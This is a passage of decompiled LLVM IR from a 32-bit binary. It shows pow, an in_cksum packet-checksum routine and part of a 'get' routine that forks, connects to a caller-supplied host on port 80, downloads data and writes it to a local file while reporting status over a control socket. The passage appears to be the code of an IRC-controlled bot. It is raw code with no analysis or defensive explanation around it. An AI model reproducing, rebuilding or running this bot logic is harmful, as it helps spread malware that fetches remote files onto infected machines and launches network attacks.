  %v5_80488e8 = load i8, i8* %v4_80488e8, align 1
  %v10_80488f0 = icmp eq i8 %v5_80488e8, 10
  br i1 %v10_80488f0, label %dec_label_pc_8048906, label %dec_label_pc_80488f4

dec_label_pc_80488f4:                             ; preds = %dec_label_pc_80488e2
  %v5_80488fa = load i8, i8* %v4_80488e8, align 1
  %v10_8048902 = icmp eq i8 %v5_80488fa, 13
  %v1_8048904 = icmp eq i1 %v10_8048902, false
  br i1 %v1_8048904, label %dec_label_pc_8048914, label %dec_label_pc_8048906

dec_label_pc_8048906:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_80488e2
  store i8 0, i8* %v4_80488e8, align 1
  br label %dec_label_pc_8048914

dec_label_pc_8048914:                             ; preds = %dec_label_pc_80488f4, %dec_label_pc_8048906
  store i32 %v4_80487aa, i32* %stack_var_-1260, align 4
  %v3_8048935 = call i32 @Send(i32 %v4_80487aa, i32 ptrtoint ([25 x i8]* @global_var_805a71f.37 to i32))
  store i32 %v4_80487aa, i32* %stack_var_-1260, align 4
  %v1_8048940 = call i32 @close(i32 %v4_80487aa)
  store i32 %v4_80486fe, i32* %stack_var_-1260, align 4
  %v1_804894b = call i32 @close(i32 %v4_80486fe)
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_8048957 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804895c

dec_label_pc_804895c:                             ; preds = %dec_label_pc_8048782, %dec_label_pc_8048766, %dec_label_pc_8048710, %entry, %dec_label_pc_8048914
  %v0_8048964 = phi i32 [ 0, %dec_label_pc_8048782 ], [ %v3_8048774, %dec_label_pc_8048766 ], [ %v4_8048758, %dec_label_pc_8048710 ], [ %v4_80486fe, %entry ], [ %v1_8048957, %dec_label_pc_8048914 ]
  ret i32 %v0_8048964

; uselistorder directives
  uselistorder i32 %v5_804888b, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v3_8048857, { 1, 0 }
  uselistorder i32 %v4_80487aa, { 5, 4, 3, 2, 7, 6, 1, 0, 8 }
  uselistorder i32 %v3_8048774, { 1, 0 }
  uselistorder i32 %v4_8048758, { 1, 0 }
  uselistorder i32 %v4_80486fe, { 1, 3, 2, 5, 4, 7, 6, 9, 8, 0 }
  uselistorder i32* %stack_var_-1260, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_804895c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048914, { 1, 0 }
  uselistorder label %dec_label_pc_80488e2, { 1, 0 }
  uselistorder label %dec_label_pc_80488ab, { 1, 0 }
  uselistorder label %dec_label_pc_8048849, { 1, 0 }
  uselistorder label %dec_label_pc_80487c4, { 1, 0 }
}

define i32 @pow(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048965 = load i32, i32* @ebp, align 4
  store i32 %v0_8048965, i32* %stack_var_-4, align 4
  %v4_8048965 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048965, i32* @ebp, align 4
  %v4_804896b = icmp eq i32 %arg2, 0
  %v1_804896f = icmp eq i1 %v4_804896b, false
  br i1 %v1_804896f, label %dec_label_pc_804897a, label %dec_label_pc_80489a4

dec_label_pc_804897a:                             ; preds = %entry
  %v4_804897a = add i32 %arg2, -1
  %v12_804897a = icmp eq i32 %v4_804897a, 0
  %v1_804897e = icmp eq i1 %v12_804897a, false
  br i1 %v1_804897e, label %dec_label_pc_8048988, label %dec_label_pc_8048980

dec_label_pc_8048980:                             ; preds = %dec_label_pc_804897a
  %v4_8048980 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80489a4

dec_label_pc_8048988:                             ; preds = %dec_label_pc_804897a
  %v4_8048996 = call i32 @pow(i64 %arg1, i32 %v4_804897a)
  %v6_804899d = sext i32 %v4_8048996 to i64
  %v8_804899d = mul nsw i64 %v6_804899d, %arg1
  %v9_804899d = trunc i64 %v8_804899d to i32
  br label %dec_label_pc_80489a4

dec_label_pc_80489a4:                             ; preds = %entry, %dec_label_pc_8048980, %dec_label_pc_8048988
  %stack_var_-8.0.off0 = phi i32 [ %v9_804899d, %dec_label_pc_8048988 ], [ %v4_8048980, %dec_label_pc_8048980 ], [ 1, %entry ]
  ret i32 %stack_var_-8.0.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i64 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80489a4, { 2, 1, 0 }
}

define i32 @in_cksum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80489a9 = load i32, i32* @ebp, align 4
  %v4_80489db17 = add i32 %arg2, -1
  %v9_80489db18 = sub i32 0, %arg2
  %v10_80489db19 = and i32 %arg2, %v9_80489db18
  %v11_80489db20 = icmp slt i32 %v10_80489db19, 0
  %v12_80489db21 = icmp eq i32 %v4_80489db17, 0
  %v13_80489db22 = icmp slt i32 %v4_80489db17, 0
  %v3_80489df23 = icmp eq i1 %v13_80489db22, %v11_80489db20
  %v4_80489df24 = icmp eq i1 %v12_80489db21, false
  %v5_80489df25 = and i1 %v4_80489df24, %v3_80489df23
  br i1 %v5_80489df25, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489ca:                             ; preds = %entry, %dec_label_pc_80489ca
  %stack_var_-24.028 = phi i16 [ %v6_80489d0, %dec_label_pc_80489ca ], [ 0, %entry ]
  %stack_var_-28.027 = phi i16* [ %v23_80489d3, %dec_label_pc_80489ca ], [ %arg1, %entry ]
  %v3_80489d726 = phi i32 [ %v4_80489d7, %dec_label_pc_80489ca ], [ %arg2, %entry ]
  %v4_80489ca = ptrtoint i16* %stack_var_-28.027 to i32
  %v2_80489cd = load i16, i16* %stack_var_-28.027, align 2
  %v6_80489d0 = add i16 %v2_80489cd, %stack_var_-24.028
  %v5_80489d3 = add i32 %v4_80489ca, 2
  %v23_80489d3 = inttoptr i32 %v5_80489d3 to i16*
  %v4_80489d7 = add i32 %v3_80489d726, -2
  %v4_80489db = add i32 %v3_80489d726, -3
  %v9_80489db = sub i32 2, %v3_80489d726
  %v10_80489db = and i32 %v4_80489d7, %v9_80489db
  %v11_80489db = icmp slt i32 %v10_80489db, 0
  %v12_80489db = icmp eq i32 %v4_80489db, 0
  %v13_80489db = icmp slt i32 %v4_80489db, 0
  %v3_80489df = icmp eq i1 %v13_80489db, %v11_80489db
  %v4_80489df = icmp eq i1 %v12_80489db, false
  %v5_80489df = and i1 %v4_80489df, %v3_80489df
  br i1 %v5_80489df, label %dec_label_pc_80489ca, label %dec_label_pc_80489e1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ca, %entry
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80489d3, %dec_label_pc_80489ca ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v6_80489d0, %dec_label_pc_80489ca ]
  %v4_80489df.lcssa = phi i1 [ %v4_80489df24, %entry ], [ %v4_80489df, %dec_label_pc_80489ca ]
  br i1 %v4_80489df.lcssa, label %dec_label_pc_80489f9, label %dec_label_pc_80489e7

dec_label_pc_80489e7:                             ; preds = %dec_label_pc_80489e1
  %v1_80489ed = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_80489ed = load i8, i8* %v1_80489ed, align 1
  %v3_80489ed = zext i8 %v2_80489ed to i16
  %v6_80489f6 = add i16 %v3_80489ed, %stack_var_-24.0.lcssa
  br label %dec_label_pc_80489f9

dec_label_pc_80489f9:                             ; preds = %dec_label_pc_80489e1, %dec_label_pc_80489e7
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80489e1 ], [ %v6_80489f6, %dec_label_pc_80489e7 ]
  %v4_80489f9 = sext i16 %stack_var_-24.1 to i32
  %v2_80489fc = sdiv i32 %v4_80489f9, 65536
  %v2_8048a03 = add nsw i32 %v2_80489fc, %v4_80489f9
  %sext = mul i32 %v2_8048a03, 65536
  %v4_8048a08 = sdiv i32 %sext, 65536
  %v2_8048a0b = ashr i32 %sext, 31
  %v6_8048a0e = add nsw i32 %v2_8048a0b, %v4_8048a08
  %sext4 = mul i32 %v6_8048a0e, 65536
  %tmp = sdiv i32 %sext4, -65536
  %v1_8048a15 = add i32 %tmp, -1
  store i32 %v0_80489a9, i32* @ebp, align 4
  ret i32 %v1_8048a15

; uselistorder directives
  uselistorder i32 %v4_80489f9, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80489db, { 1, 0 }
  uselistorder i32 %v4_80489d7, { 1, 0 }
  uselistorder label %dec_label_pc_80489f9, { 1, 0 }
  uselistorder label %dec_label_pc_80489ca, { 1, 0 }
}

define i32 @get(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8048a29 = load i32, i32* @esi, align 4
  store i32 %v0_8048a29, i32* %stack_var_-12, align 4
  %v2_8048a2a = icmp ult i32* %stack_var_-12, inttoptr (i32 5232 to i32*)
  store i1 %v2_8048a2a, i1* %cf.global-to-local, align 1
  %v1_8048a36 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048a3b = icmp eq i32 %v1_8048a36, 0
  %v1_8048a3d = icmp eq i1 %v1_8048a3b, false
  br i1 %v1_8048a3d, label %dec_label_pc_8048f45, label %dec_label_pc_8048a43

dec_label_pc_8048a43:                             ; preds = %entry
  %v4_8048a43 = add i32 %arg3, -1
  %v8_8048a43 = icmp eq i32 %arg3, 0
  %v9_8048a43 = sub i32 0, %arg3
  %v10_8048a43 = and i32 %arg3, %v9_8048a43
  %v11_8048a43 = icmp slt i32 %v10_8048a43, 0
  store i1 %v8_8048a43, i1* %cf.global-to-local, align 1
  %v12_8048a43 = icmp eq i32 %v4_8048a43, 0
  %v13_8048a43 = icmp slt i32 %v4_8048a43, 0
  %v3_8048a47 = icmp eq i1 %v13_8048a43, %v11_8048a43
  %v4_8048a47 = icmp eq i1 %v12_8048a43, false
  %v5_8048a47 = and i1 %v4_8048a47, %v3_8048a47
  br i1 %v5_8048a47, label %dec_label_pc_8048a6f, label %dec_label_pc_8048a49

dec_label_pc_8048a49:                             ; preds = %dec_label_pc_8048a43
  %v3_8048a5e = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_805a738.38 to i32))
  %v1_8048a6a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048a6f

dec_label_pc_8048a6f:                             ; preds = %dec_label_pc_8048a43, %dec_label_pc_8048a49
  %v4_8048a86 = call i32 @socket(i32 2, i32 1, i32 0)
  %v8_8048a8e = icmp ne i32 %v4_8048a86, -1
  store i1 %v8_8048a8e, i1* %cf.global-to-local, align 1
  %v13_8048a8e = icmp eq i32 %v4_8048a86, -1
  %v1_8048a92 = icmp eq i1 %v13_8048a8e, false
  br i1 %v1_8048a92, label %dec_label_pc_8048aba, label %dec_label_pc_8048a94

dec_label_pc_8048a94:                             ; preds = %dec_label_pc_8048a6f
  %v3_8048aa9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_805a75c.39 to i32))
  %v1_8048ab5 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048aba

dec_label_pc_8048aba:                             ; preds = %dec_label_pc_8048a6f, %dec_label_pc_8048a94
  %v1_8048abd = add i32 %arg4, 4
  %v5_8048abd = icmp ugt i32 %arg4, -5
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v1_8048ac0 = inttoptr i32 %v1_8048abd to i32*
  %v2_8048ac0 = load i32, i32* %v1_8048ac0, align 4
  store i1 false, i1* @df, align 1
  %v4_8048add = inttoptr i32 %v2_8048ac0 to i8*
  store i32 %v2_8048ac0, i32* @esi, align 4
  %v7_8048aef = call i32 @_strncmp(i8* %v4_8048add, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805a781.40, i32 0, i32 0), i32 7)
  %v8_8048aef = urem i32 %v7_8048aef, 2
  %v9_8048aef = icmp eq i32 %v8_8048aef, 0
  %v0_8048af1 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048af1 = or i1 %v0_8048af1, %v9_8048aef
  %v3_8048af1 = zext i1 %v2_8048af1 to i32
  %v4_8048af1 = load i32, i32* @edx, align 4
  %v5_8048af1 = and i32 %v4_8048af1, -256
  %v6_8048af1 = or i32 %v3_8048af1, %v5_8048af1
  %v7_8048af1 = xor i32 %v6_8048af1, 1
  store i32 %v7_8048af1, i32* %edx.global-to-local, align 4
  %v1_8048af9 = trunc i32 %v7_8048af1 to i8
  %v3_8048af9 = zext i1 %v0_8048af1 to i8
  %v15_8048af9 = icmp eq i8 %v1_8048af9, %v3_8048af9
  %v1_8048b02 = icmp eq i1 %v15_8048af9, false
  store i1 %v5_8048abd, i1* %cf.global-to-local, align 1
  %v2_8048b29 = load i32, i32* %v1_8048ac0, align 4
  br i1 %v1_8048b02, label %dec_label_pc_8048b23, label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048aba
  %v1_8048b0c = add i32 %v2_8048b29, 7
  %v5_8048b0c = icmp ugt i32 %v2_8048b29, -8
  store i1 %v5_8048b0c, i1* %cf.global-to-local, align 1
  %v2_8048b13 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b13, i32* @eax, align 4
  %v3_8048b1c = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b1c = call i32 @strcpy(i8* %v3_8048b1c, i32 %v1_8048b0c)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048aba
  %v2_8048b2f = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_8048b2f, i32* @eax, align 4
  %v3_8048b38 = bitcast i32* %stack_var_-1096 to i8*
  %v4_8048b38 = call i32 @strcpy(i8* %v3_8048b38, i32 %v2_8048b29)
  br label %dec_label_pc_8048b3d

dec_label_pc_8048b3d:                             ; preds = %dec_label_pc_8048b04, %dec_label_pc_8048b23
  %v4_8048b60.pre-phi = phi i8* [ %v3_8048b1c, %dec_label_pc_8048b04 ], [ %v3_8048b38, %dec_label_pc_8048b23 ]
  %v2_8048b4c.pre-phi = phi i32 [ %v2_8048b13, %dec_label_pc_8048b04 ], [ %v2_8048b2f, %dec_label_pc_8048b23 ]
  br label %dec_label_pc_8048b49

dec_label_pc_8048b46:                             ; preds = %dec_label_pc_8048b71
  %v4_8048b46 = add i32 %storemerge6, 1
  br label %dec_label_pc_8048b49

dec_label_pc_8048b49:                             ; preds = %dec_label_pc_8048b3d, %dec_label_pc_8048b46
  %storemerge6 = phi i32 [ %v4_8048b46, %dec_label_pc_8048b46 ], [ 0, %dec_label_pc_8048b3d ]
  store i32 %storemerge6, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048b4c.pre-phi, i32* @edi, align 4
  %v3_8048b66 = call i32 @_strlen(i8* %v4_8048b60.pre-phi)
  %v0_8048b6d = load i32, i32* @edx, align 4
  %v7_8048b6d = icmp ult i32 %v0_8048b6d, %v3_8048b66
  store i1 %v7_8048b6d, i1* %cf.global-to-local, align 1
  %v1_8048b6f = icmp eq i1 %v7_8048b6d, false
  br i1 %v1_8048b6f, label %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge, label %dec_label_pc_8048b71

dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge: ; preds = %dec_label_pc_8048b49
  %v0_8048b83.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge6, -1092
  br label %dec_label_pc_8048b80

dec_label_pc_8048b71:                             ; preds = %dec_label_pc_8048b49
  %v0_8048b74 = load i32, i32* @ebp, align 4
  %v2_8048b74 = add i32 %storemerge6, -1092
  %v3_8048b74 = add i32 %v0_8048b74, %v2_8048b74
  %v4_8048b74 = inttoptr i32 %v3_8048b74 to i8*
  %v5_8048b74 = load i8, i8* %v4_8048b74, align 1
  %v6_8048b7c = icmp ult i8 %v5_8048b74, 47
  store i1 %v6_8048b7c, i1* %cf.global-to-local, align 1
  %v10_8048b7c = icmp eq i8 %v5_8048b74, 47
  %v1_8048b7e = icmp eq i1 %v10_8048b7c, false
  br i1 %v1_8048b7e, label %dec_label_pc_8048b46, label %dec_label_pc_8048b80

dec_label_pc_8048b80:                             ; preds = %dec_label_pc_8048b71, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge
  %v2_8048b83.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v2_8048b74, %dec_label_pc_8048b71 ]
  %v0_8048b83 = phi i32 [ %v0_8048b83.pre, %dec_label_pc_8048b49.dec_label_pc_8048b80_crit_edge ], [ %v0_8048b74, %dec_label_pc_8048b71 ]
  %v3_8048b83 = add i32 %v0_8048b83, %v2_8048b83.pre-phi
  %v4_8048b83 = inttoptr i32 %v3_8048b83 to i8*
  store i8 0, i8* %v4_8048b83, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v2_8048b98 = call i32 @htons(i16 80)
  %v1_8048bad = call i32 @inet_addr(i32 %v2_8048b4c.pre-phi)
  %v8_8048bb5 = icmp ne i32 %v1_8048bad, -1
  store i1 %v8_8048bb5, i1* %cf.global-to-local, align 1
  %v13_8048bb5 = icmp eq i32 %v1_8048bad, -1
  %v1_8048bb9 = icmp eq i1 %v13_8048bb5, false
  br i1 %v1_8048bb9, label %dec_label_pc_8048c17, label %dec_label_pc_8048bbb

dec_label_pc_8048bbb:                             ; preds = %dec_label_pc_8048b80
  %v1_8048bc4 = call i32 @__GI_gethostbyname(i32 %v2_8048b4c.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048bcc = icmp eq i32 %v1_8048bc4, 0
  %v1_8048bd0 = icmp eq i1 %v4_8048bcc, false
  br i1 %v1_8048bd0, label %dec_label_pc_8048bf8, label %dec_label_pc_8048bd2

dec_label_pc_8048bd2:                             ; preds = %dec_label_pc_8048bbb
  %v3_8048be7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a78c.41 to i32))
  %v1_8048bf3 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048bf8

dec_label_pc_8048bf8:                             ; preds = %dec_label_pc_8048bbb, %dec_label_pc_8048bd2
  %v1_8048bfb = add i32 %v1_8048bc4, 12
  %v2_8048bfb = inttoptr i32 %v1_8048bfb to i32*
  %v3_8048bfb = load i32, i32* %v2_8048bfb, align 4
  %v1_8048c03 = add i32 %v1_8048bc4, 16
  %v2_8048c03 = inttoptr i32 %v1_8048c03 to i32*
  %v3_8048c03 = load i32, i32* %v2_8048c03, align 4
  %v1_8048c06 = inttoptr i32 %v3_8048c03 to i32*
  %v2_8048c06 = load i32, i32* %v1_8048c06, align 4
  store i32 %v2_8048c06, i32* %edx.global-to-local, align 4
  %v5_8048c0b = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048c0b, i1* %cf.global-to-local, align 1
  %v15_8048c0b = ptrtoint i32* %stack_var_-68 to i32
  %tmp66 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048c0b, i32* @edi, align 4
  %v1_8048c10 = inttoptr i32 %v2_8048c06 to i8*
  store i32 %v2_8048c06, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048c13 = call i8* @_memcpy(i8* %tmp66, i8* %v1_8048c10, i32 %v3_8048bfb)
  %v8_8048c13 = ptrtoint i8* %v7_8048c13 to i32
  store i32 %v8_8048c13, i32* @ecx, align 4
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c17:                             ; preds = %dec_label_pc_8048b80
  store i32 %v1_8048bad, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048c1d

dec_label_pc_8048c1d:                             ; preds = %dec_label_pc_8048bf8, %dec_label_pc_8048c17
  %v2_8048c1d.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048c20 = icmp ugt i32* %stack_var_-72, inttoptr (i32 -9 to i32*)
  store i1 %v5_8048c20, i1* %cf.global-to-local, align 1
  %v4_8048c45 = call i32 @connect(i32 %v4_8048a86, i32 %v2_8048c1d.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c4a = icmp eq i32 %v4_8048c45, 0
  br i1 %v1_8048c4a, label %dec_label_pc_8048c74, label %dec_label_pc_8048c4e

dec_label_pc_8048c4e:                             ; preds = %dec_label_pc_8048c1d
  %v3_8048c63 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_805a7b4.42 to i32))
  %v1_8048c6f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048c74

dec_label_pc_8048c74:                             ; preds = %dec_label_pc_8048c1d, %dec_label_pc_8048c4e
  %v2_8048c7f = add i32 %storemerge6, %v2_8048b4c.pre-phi
  %v7_8048c7f = icmp ult i32 %v2_8048c7f, %v2_8048b4c.pre-phi
  store i1 %v7_8048c7f, i1* %cf.global-to-local, align 1
  %v1_8048c81 = add i32 %v2_8048c7f, 1
  store i32 %v1_8048c81, i32* %edx.global-to-local, align 4
  %v3_8048ca0 = call i32 @Send(i32 %v4_8048a86, i32 ptrtoint ([276 x i8]* @global_var_805a7dc.43 to i32))
  %v3_8048cba = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_805a8f0.44 to i32))
  %v1_8048cc2 = add i32 %arg4, 8
  %v5_8048cc2 = icmp ugt i32 %arg4, -9
  store i1 %v5_8048cc2, i1* %cf.global-to-local, align 1
  %v1_8048cc5 = inttoptr i32 %v1_8048cc2 to i32*
  %v2_8048cc5 = load i32, i32* %v1_8048cc5, align 4
  store i32 %v2_8048cc5, i32* @eax, align 4
  %v3_8048cd2 = call i32 @__GI_fopen(i32 %v2_8048cc5, i32 ptrtoint ([3 x i8]* @global_var_805a90c.45 to i32))
  %v2_8048cea = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048cfa108 = call i32 @recv(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67111 = icmp slt i32 %v5_8048cfa108, 1
  br i1 %tmp67111, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048cda.loopexit:                    ; preds = %dec_label_pc_8048e0e
  %v5_8048cfa = call i32 @recv(i32 %v4_8048a86, i32 %v2_8048cea, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v5_8048cfa, 1
  br i1 %tmp67, label %dec_label_pc_8048e22.loopexit12, label %dec_label_pc_8048d0c

dec_label_pc_8048d0c:                             ; preds = %dec_label_pc_8048c74, %dec_label_pc_8048cda.loopexit
  %v5_8048cfa112 = phi i32 [ %v5_8048cfa, %dec_label_pc_8048cda.loopexit ], [ %v5_8048cfa108, %dec_label_pc_8048c74 ]
  %v4_8048d0c = add i32 %v5_8048cfa112, -4095
  %v8_8048d0c = icmp ult i32 %v5_8048cfa112, 4095
  %v9_8048d0c = sub i32 4094, %v5_8048cfa112
  %v10_8048d0c = and i32 %v9_8048d0c, %v5_8048cfa112
  %v11_8048d0c = icmp slt i32 %v10_8048d0c, 0
  store i1 %v8_8048d0c, i1* %cf.global-to-local, align 1
  %v12_8048d0c = icmp eq i32 %v4_8048d0c, 0
  %v13_8048d0c = icmp slt i32 %v4_8048d0c, 0
  %v3_8048d13 = icmp eq i1 %v13_8048d0c, %v11_8048d0c
  %v4_8048d13 = icmp eq i1 %v12_8048d0c, false
  %v5_8048d13 = and i1 %v4_8048d13, %v3_8048d13
  br i1 %v5_8048d13, label %dec_label_pc_8048d2c.lr.ph, label %dec_label_pc_8048d15

dec_label_pc_8048d15:                             ; preds = %dec_label_pc_8048d0c
  %v0_8048d18 = load i32, i32* @ebp, align 4
  %v2_8048d18 = add i32 %v5_8048cfa112, -5188
  %v3_8048d18 = add i32 %v2_8048d18, %v0_8048d18
  %v4_8048d18 = inttoptr i32 %v3_8048d18 to i8*
  store i8 0, i8* %v4_8048d18, align 1
  br label %dec_label_pc_8048d2c.lr.ph

dec_label_pc_8048d2c.lr.ph:                       ; preds = %dec_label_pc_8048d15, %dec_label_pc_8048d0c
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d2c

dec_label_pc_8048d2c:                             ; preds = %dec_label_pc_8048d2c.lr.ph, %dec_label_pc_8048e0e
  %storemerge5107 = phi i32 [ 0, %dec_label_pc_8048d2c.lr.ph ], [ %v4_8048e0e, %dec_label_pc_8048e0e ]
  store i32 %storemerge5107, i32* %edx.global-to-local, align 4
  %v2_8048d37 = add i32 %storemerge5107, %v2_8048cea
  %v7_8048d37 = icmp ult i32 %v2_8048d37, %v2_8048cea
  store i1 %v7_8048d37, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048d54 = inttoptr i32 %v2_8048d37 to i8*
  store i32 %v2_8048d37, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805a90f.46 to i32), i32* @edi, align 4
  %v7_8048d66 = call i32 @_strncmp(i8* %v4_8048d54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805a90f.46, i32 0, i32 0), i32 4)
  %v8_8048d66 = urem i32 %v7_8048d66, 2
  %v9_8048d66 = icmp eq i32 %v8_8048d66, 0
  %v0_8048d68 = load i1, i1* %cf.global-to-local, align 1
  %v2_8048d68 = or i1 %v0_8048d68, %v9_8048d66
  %v3_8048d68 = zext i1 %v2_8048d68 to i32
  %v4_8048d68 = load i32, i32* %edx.global-to-local, align 4
  %v5_8048d68 = and i32 %v4_8048d68, -256
  %v6_8048d68 = or i32 %v3_8048d68, %v5_8048d68
  %v7_8048d68 = xor i32 %v6_8048d68, 1
  store i32 %v7_8048d68, i32* %edx.global-to-local, align 4
  %v3_8048d6e = and i32 %v7_8048d66, -256
  %v1_8048d70 = trunc i32 %v7_8048d68 to i8
  %v3_8048d70 = zext i1 %v0_8048d68 to i8
  %v4_8048d70 = sub nsw i8 %v1_8048d70, %v3_8048d70
  %v15_8048d70 = icmp eq i8 %v4_8048d70, 0
  %v20_8048d70 = zext i8 %v4_8048d70 to i32
  %v23_8048d70 = or i32 %v20_8048d70, %v3_8048d6e
  store i32 %v23_8048d70, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d79 = icmp eq i1 %v15_8048d70, false
  br i1 %v1_8048d79, label %dec_label_pc_8048e0e, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d2c
  %v4_8048d7f = add i32 %storemerge5107, 4
  %v1_8048d8e = add i32 %v3_8048cd2, 52
  %v2_8048d8e = inttoptr i32 %v1_8048d8e to i32*
  %v1_8048d98 = add i32 %v3_8048cd2, 16
  %v2_8048d98 = inttoptr i32 %v1_8048d98 to i32*
  %v1_8048d9e = add i32 %v3_8048cd2, 28
  %v2_8048d9e = inttoptr i32 %v1_8048d9e to i32*
  %v10_8048e0389 = icmp ult i32 %v4_8048d7f, %v5_8048cfa112
  store i1 %v10_8048e0389, i1* %cf.global-to-local, align 1
  %v5_8048e0696 = icmp slt i32 %v4_8048d7f, %v5_8048cfa112
  br i1 %v5_8048e0696, label %dec_label_pc_8048d85, label %dec_label_pc_8048e22

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048dfd
  %storemerge10.in97 = phi i32 [ %v4_8048dfd, %dec_label_pc_8048dfd ], [ %v4_8048d7f, %dec_label_pc_8048d7f ]
  %v3_8048d8e = load i32, i32* %v2_8048d8e, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d91 = icmp eq i32 %v3_8048d8e, 0
  br i1 %v1_8048d91, label %dec_label_pc_8048de0, label %dec_label_pc_8048d95

dec_label_pc_8048d95:                             ; preds = %dec_label_pc_8048d85
  %v3_8048d98 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048d98, i32* %edx.global-to-local, align 4
  %v3_8048d9e = load i32, i32* %v2_8048d9e, align 4
  %v7_8048da1 = icmp ult i32 %v3_8048d98, %v3_8048d9e
  store i1 %v7_8048da1, i1* %cf.global-to-local, align 1
  %v1_8048da3 = icmp eq i1 %v7_8048da1, false
  br i1 %v1_8048da3, label %dec_label_pc_8048dc1, label %dec_label_pc_8048da5

dec_label_pc_8048da5:                             ; preds = %dec_label_pc_8048d95
  %v3_8048da8 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048da8, i32* %edx.global-to-local, align 4
  %v0_8048dae = load i32, i32* @ebp, align 4
  %v2_8048dae = add i32 %storemerge10.in97, -5188
  %v3_8048dae = add i32 %v2_8048dae, %v0_8048dae
  %v4_8048dae = inttoptr i32 %v3_8048dae to i8*
  %v5_8048dae = load i8, i8* %v4_8048dae, align 1
  %v3_8048db6 = inttoptr i32 %v3_8048da8 to i8*
  store i8 %v5_8048dae, i8* %v3_8048db6, align 1
  %v0_8048db8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048db8 = add i32 %v0_8048db8, 1
  store i32 %v1_8048db8, i32* %edx.global-to-local, align 4
